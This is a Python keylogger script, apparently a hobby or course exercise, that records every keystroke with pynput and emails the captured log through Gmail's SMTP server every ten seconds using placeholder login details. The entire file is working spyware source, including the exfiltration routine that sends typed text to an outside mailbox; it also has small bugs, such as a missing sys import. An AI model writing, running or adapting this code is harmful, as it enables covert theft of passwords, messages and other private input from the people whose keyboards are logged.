#!/usr/bin/env python3

import pynput.keyboard
import threading
import signal
from termcolor import colored
import smtplib
from email.mime.text import MIMEText


def close_application(sig, frame):
    print(colored("[!] Closing application...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, close_application)


class Keylogger:

    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.first_run = True

    def process_key_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_key = {"Key.enter": "[ENTER]", "Key.backspace": "[BACKSPACE]", "Key.space": " ", "Key.alt_l": "[ALT_L]", "Key.alt_r": "[ALT_R]", "Key.tab": "[TAB]", "Key.ctrl_l": "[CTRL_L]", "Key.ctrl_r": "[CTRL_R]", "Key.shift": "[SHIFT]", "Key.shift_r": "[SHIFT_R]", "Key.cmd": "[CMD]", "Key.cmd_r": "[CMD_R]", "Key.esc": "[ESC]"}
            self.log += special_key.get(key, f" {str(key)} ")

    def send_mail(self, body, sender, recipient, password):
        msg = MIMEText(body)
        msg["Subject"] = "Keylogger"
        msg["From"] = sender
        msg["To"] = recipient

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender, password)
            server.sendmail(sender, recipient, msg.as_string())

    def report(self):
        email_body = "[+] Keylogger started successfully" if self.first_run else self.log
        self.send_mail(email_body, "me@gmail.com", ["me@gmail.com"], "test123")
        self.log = ""
        if self.first_run:
            self.first_run = False
        if not self.request_shutdown:
            self.timer = threading.Timer(10, self.report)
            self.timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def stop(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()

